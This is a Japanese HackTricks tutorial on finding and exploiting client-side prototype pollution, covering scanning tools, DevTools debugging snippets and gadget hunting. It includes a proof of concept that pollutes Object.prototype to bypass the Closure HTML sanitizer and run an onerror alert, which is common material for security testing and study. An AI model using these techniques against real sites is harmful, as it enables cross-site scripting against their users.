# クライアントサイド Prototype Pollution

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をチェック！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**する。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## 自動ツールを使用した発見

ツール [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**、** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **および** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) は、**prototype pollutionの脆弱性を見つける**ために使用できます。

さらに、**ブラウザ拡張機能** [**PPScan**](https://github.com/msrkp/PPScan) を使用して、アクセスする**ページを自動的にスキャン**し、prototype pollutionの脆弱性を**自動的に**検出することもできます。

### プロパティが使用されている場所のデバッグ <a href="#5530" id="5530"></a>

{% code overflow="wrap" %}
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype,'potentialGadget', {__proto__:null, get(){
console.trace();
return 'test';
}})
```
{% endcode %}

### プロトタイプ汚染の根本原因を見つける <a href="#5530" id="5530"></a>

いずれかのツールで**プロトタイプ汚染の脆弱性**が**特定**された場合、もし**コード**があまり**複雑でない**なら、Chrome Developer ToolsでJSコード内を**`location.hash/decodeURIComponent/location.search`**という**キーワード**で**検索**し、脆弱な箇所を見つけることができます。

コードが大きく複雑な場合、脆弱なコードを**発見する簡単な方法**があります：

* ツールの一つを使用して**脆弱性を見つけ**、コンストラクタ内で**プロパティを設定する**ための**ペイロード**を取得します。ppmapでは、次のようなものが提供されます：`constructor[prototype][ppmap]=reserved`
* 次に、ページで実行される最初のJSコード行に**ブレークポイントを設定**し、ペイロードを含むページをリフレッシュして、そこで**実行が一時停止する**ようにします。
* JSの実行が一時停止している間に、JSコンソールに以下のスクリプトを**貼り付けます**。このコードは、'ppmap'プロパティが作成された時点を示すので、それがどこで作成されたかを見つけることができます。
```javascript
function debugAccess(obj, prop, debugGet=true){

var origValue = obj[prop];

Object.defineProperty(obj, prop, {
get: function () {
if ( debugGet )
debugger;
return origValue;
},
set: function(val) {
debugger;
return origValue = val;
}
});

};

debugAccess(Object.prototype, 'ppmap')
```
**Sources**に戻り、「**Resume** script **execution**」をクリックします。これを行うと、全ての**javascript**が**実行**され、予想通りppmapが再び汚染されます。スニペットの助けを借りて、ppmapプロパティが正確にどこで汚染されているかを見つけることができます。**Call** **Stack**をクリックすると、**pollution**が**発生した****異なる**スタックに直面します。

しかし、どれを選ぶべきでしょうか？ほとんどの場合、Prototype PollutionはJavascriptライブラリで発生するので、.jsライブラリファイルに添付されているスタックを目指します（画像の右側を見て、どのエンドポイントにスタックが添付されているかを確認します）。この場合、4行目と6行目に2つのスタックがありますが、論理的には汚染が初めて発生する4行目を選びます。これは、この行が脆弱性の原因であることを意味します。スタックをクリックすると、脆弱なコードにリダイレクトされます。

![](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## スクリプトガジェットの発見

ガジェットは、**PP脆弱性が発見された後に悪用されるコード**です。

アプリケーションがシンプルな場合、**`srcdoc/innerHTML/iframe/createElement`**のような**キーワード**を**検索**し、ソースコードをレビューしてjavascript実行に**繋がるか**を確認します。時には、上記の技術ではガジェットが全く見つからないこともあります。その場合、純粋なソースコードレビューが以下の例のような素晴らしいガジェットを明らかにします。

### 例 MithilライブラリコードでPPガジェットを見つける

このライトアップをチェックしてください：[https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## 脆弱なライブラリのペイロードの再コンパイル

* [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
* [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PPを介したHTMLサニタイザーのバイパス

[**この研究**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)は、いくつかのHTMLサニタイザーライブラリによって提供されるサニタイズを**バイパス**するために使用するPPガジェットを示しています：

* #### sanitize-html

<figure><img src="../../../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

* #### dompurify

<figure><img src="../../../.gitbook/assets/image (669).png" alt=""><figcaption></figcaption></figure>

* #### Closure
```html
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## 参考文献

* [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
* [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
* [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローになる方法を学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
